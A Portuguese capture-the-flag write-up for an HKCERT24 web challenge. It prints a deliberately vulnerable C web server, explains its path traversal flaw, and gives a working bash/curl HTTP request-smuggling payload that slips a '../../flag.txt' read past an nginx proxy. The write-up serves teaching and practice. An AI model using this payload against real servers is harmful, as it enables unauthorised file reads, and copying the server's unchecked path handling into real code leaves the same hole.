# Duckware Team - High Knowledge Preparatory School
###### Solved by @Antonio-alexandre

> This CTF is about HTTP smuggling, nginx bypass, path transversal

## Desafio: High Knowledge Preparatory School (HTTP Smuggling, Nginx Bypass, Path Transversal)
#### Introdução

Esse desafio consiste em um site onde desafia o usuário a descobrir suas vulnerabilidades e explorá-las a fim de descobrir uma flag.

#### Análise Inicial

Nos deparamos com um arquivo zipado, contendo um servidor a ser executado no Docker. 

Basta então, iniciar o servidor e executá-lo.

Fazendo isso, temos acesso ao seguinte site:

[![Print.png](https://i.postimg.cc/yYcM9ntN/Print.png)](https://postimg.cc/F7FCXb9t)

Aparentemente é uma escolha de conhecimentos técnicos.

#### Solução

Esse é um site "básico", rodando em um servidor local que possui um proxy Nginx. Esse proxy é utilizado para repassar toda e qualquer requisição a ser executada para o backend.

Assim que obtemos essa informação, o próximo passo é explorar o código fonte. Para isso, iremos abrir as pastas e analisar o código interno.

```
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#define PORT 8000
#define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && \
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = '\0';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %s\r\n"
        "Server: mystiz-web/1.0.0\r\n"
        "Content-Type: text/html\r\n"
        "Connection: %s\r\n"
        "Content-Length: %u\r\n"
        "\r\n";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}
```

Como é possível analisar no seguinte trecho, o site possui uma vulnerabilidade conhecida como `path transversal`:

```
snprintf(real_path, sizeof(real_path), "public/%s", filename);
```

Nesse trecho, há uma concatenação do diretório `public` com o arquivo a ser passado, no caso `filename`, sem executar validação ou verificação das entradas. Assim, é possível acessar todos os arquivos do diretório `public` através de uma técnica que utiliza o seguinte prefixo: `../`

Para isso, utilizaremos uma técnica conhecida como [HTTP Smuggling](https://portswigger.net/web-security/request-smuggling). Essa técnica nos permite acessar arquivos internos através da modificação de requisições HTTP. Ela consiste de forjar uma primeira requisição que o Nginx reconheça como válida, seguida de uma parte que é interpretada de forma separada pelo backend, fazendo assim que o Nginx reconheça apenas como uma única requisição, realizando assim o [Path Transversal](https://www.infosec.com.br/path-traversal/). 

Para isso, utilizaremos o seguinte código que envia a requisição da maneira que desejamos:

```
foo_value=$(python3 -c 'print("a" * 931)')
path_padding=$(python3 -c 'print("/" * (1016 - len("../../flag.txt")))')
full_path="${path_padding}../../flag.txt.js"

payload=$'GET /'"$full_path"$'GET /index.html HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n'

curl -v --http1.1 http://localhost:8081 \
  -H "Host: localhost" \
  -H "Content-Length: 1024" \
  -H "Foo: $foo_value" \
  --data-binary "$payload"
```

Resumidamente, o que esse código faz é enviar a requisição preenchendo o buffer, além de enviar a requisição GET da maneira que desejamos e por fim utilizar o curl para receber os valores da requisição.

Executando assim esse código no terminal, ele nos retorna toda a requisição que foi recebida através do `curl`, além da seguinte flag:

> `hkcert24{***REDACTED***}`
